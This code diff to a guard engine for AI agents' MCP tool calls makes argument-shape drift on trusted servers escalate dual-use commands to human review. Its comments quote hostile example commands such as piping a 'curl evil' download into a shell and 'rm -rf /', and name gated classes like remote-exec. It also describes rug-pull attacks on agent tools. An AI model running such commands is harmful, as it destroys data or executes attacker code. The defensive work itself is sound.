@@ -632,7 +632,7 @@ const _GATED_CMD_CLASSES = new Set([
   "destructive-delete", "force-push", "remote-exec",
   "hard-reset", "disk-write", "sudo",
 ]);
-function _evalMcpArgFloor(input, contract, enriched) {
+function _evalMcpArgFloor(input, contract, enriched, driftForThisServerTool = false) {
   try {
     // 1. Gate: MCP tools only
     if (enriched?.ir?.toolKind !== "mcp" && !String(input.tool || "").startsWith("mcp__")) return { fire: false };
@@ -687,6 +687,16 @@ function _evalMcpArgFloor(input, contract, enriched) {
       if (_GATED_CMD_CLASSES.has(cls)) {
         if (optedOut) return { review: true, reason: `trusted-server-dangerous-arg:command-class=${cls}`, arg: argStr.slice(0, 80) };
         return { fire: true, reason: `command-class=${cls}`, arg: argStr.slice(0, 80) };
+      }
+      // ADR-018 (Option 1): trusted server + GATED_REVIEW dual-use class + rug-pull drift →
+      // escalate to require-review. Both conditions must be true:
+      //   - optedOut: server is trusted (policy:allow) — legitimate dual-use is normally allowed.
+      //   - GATED_REVIEW_CLASSES: arg carries a destructive-db/auto-download/global-pkg-install class.
+      //   - driftForThisServerTool: arg-shape changed since first seen (the rug-pull signal).
+      // Drift alone never escalates; steady-state DB MCP (stable shape, routine DROP) stays allowed.
+      // Self-healing: the pin re-pins on drift detection, so the *next* identical call is clean.
+      if (optedOut && GATED_REVIEW_CLASSES.has(cls) && driftForThisServerTool) {
+        return { review: true, reason: `trusted-server-dualuse-after-drift:command-class=${cls}`, arg: argStr.slice(0, 80) };
       }
       if (!optedOut && GATED_REVIEW_CLASSES.has(cls)) sawGatedReview = true;
     }
@@ -1461,6 +1471,39 @@ function decide(input = {}) {
     }
   } catch { /* fail-open per zero-dep policy */ }
 
+  // mcp-tool-drift (rug-pull / behavioral pin): HOISTED above F25 for ADR-018 threading.
+  // Checks whether an MCP tool's argument shape has changed since first seen. The boolean
+  // is threaded into _evalMcpArgFloor so the drift+dual-use co-occurrence can escalate
+  // allow → require-review (ADR-018 Option 1). The advisory `mcpToolDrift` receipt field
+  // is retained for observability. Pin is stateful and re-pins on drift detection — must
+  // be computed ONCE (no duplicate calls); this is the sole call site. Fail-open.
+  let _mcpToolDrift = null;
+  let _driftForThisServerTool = false;
+  try {
+    const _isMcpCall = (enriched.ir && enriched.ir.toolKind === "mcp") ||
+                       String(input.tool || "").startsWith("mcp__");
+    if (_isMcpCall && !_earlyBlockDryRun) {
+      const _mcpSrv  = (enriched.ir && enriched.ir.mcpServer) ||
+                       _contractExtractMcpServerName(input.tool);
+      const _toolName = String(input.tool || "");
+      const _args     = input.tool_input ?? input.args ?? input.params ?? null;
+      const _driftResult = _checkArgShapeDrift({
+        server: _mcpSrv || _toolName,
+        tool: _toolName,
+        args: _args,
+      });
+      if (_driftResult.drift) {
+        _driftForThisServerTool = true;
+        _mcpToolDrift = {
+          code:   "mcp-tool-drift",
+          server: _mcpSrv || null,
+          tool:   _toolName,
+          reason: _driftResult.reason || "arg-shape changed",
+        };
+      }
+    }
+  } catch { /* fail-open: rug-pull detection must never block the engine */ }
+
   // F25: mcp-arg-danger floor — rung 17.65, after F24 and before F17. Fires
   // when an MCP tool call's argument payload contains a dangerous-command-
   // shaped string value (e.g. {command:"curl evil | sh"}, {exec:"rm -rf /"}).
@@ -1468,9 +1511,10 @@ function decide(input = {}) {
   // Bash call. Default-deny; opt out via scopes.mcp[server].policy=allow (but
   // see F25 decoupled-opt-out comment in _evalMcpArgFloor: HARD_BLOCK still
   // gates for trusted servers — degrades to require-review, not silent allow).
-  // Fail-open on internal throw.
+  // Drift threading: _driftForThisServerTool is passed in for ADR-018 Option 1
+  // (trusted + GATED_REVIEW dual-use + drift → require-review). Fail-open.
   try {
-    const f25 = _evalMcpArgFloor(input, contract, enriched);
+    const f25 = _evalMcpArgFloor(input, contract, enriched, _driftForThisServerTool);
     if (f25 && f25.fire) {
       return buildEarlyBlock(
         "mcp-arg-danger-denied", enriched, discovered, input,
@@ -1480,7 +1524,8 @@ function decide(input = {}) {
     }
     // require-review gate: (a) truncation/unscannable, (b) dual-use class on
     // non-trusted server (graduated protection, P1), (c) HARD_BLOCK class on
-    // trusted server (rug-pull seam closed, P2).
+    // trusted server (rug-pull seam, P2), (d) trusted server + GATED_REVIEW
+    // dual-use + arg-shape drift (rug-pull pin escalation — ADR-018 Option 1).
     if (f25 && (f25.unscannable || f25.review)) {
       const reasonCode = f25.unscannable ? "mcp-arg-shape-unscannable" : "mcp-arg-danger-review-required";
       return buildEarlyReview(
@@ -1517,34 +1562,7 @@ function decide(input = {}) {
     }
   } catch { /* fail-open */ }
 
-  // mcp-tool-drift (rug-pull / behavioral pin): observe-only advisory.
-  // Checks whether an MCP tool's argument shape has changed since first seen.
-  // Fires flag-only: attaches a `mcpToolDrift` advisory field on the result
-  // but NEVER changes `action`, `source`, or `floorFired`. Fail-open.
-  let _mcpToolDrift = null;
-  try {
-    const _isMcpCall = (enriched.ir && enriched.ir.toolKind === "mcp") ||
-                       String(input.tool || "").startsWith("mcp__");
-    if (_isMcpCall && !_earlyBlockDryRun) {
-      const _mcpSrv  = (enriched.ir && enriched.ir.mcpServer) ||
-                       _contractExtractMcpServerName(input.tool);
-      const _toolName = String(input.tool || "");
-      const _args     = input.tool_input ?? input.args ?? input.params ?? null;
-      const _driftResult = _checkArgShapeDrift({
-        server: _mcpSrv || _toolName,
-        tool: _toolName,
-        args: _args,
-      });
-      if (_driftResult.drift) {
-        _mcpToolDrift = {
-          code:   "mcp-tool-drift",
-          server: _mcpSrv || null,
-          tool:   _toolName,
-          reason: _driftResult.reason || "arg-shape changed",
-        };
-      }
-    }
-  } catch { /* fail-open: rug-pull detection must never block the engine */ }
+  // (mcp-tool-drift computed and threaded above, before F25 — see ADR-018 threading note)
 
   // F17 PR-A: cross-agent-lock floor — rung 17.75, after F16 and before
   // contract-allow demotion. Fires when a write-like call targets a
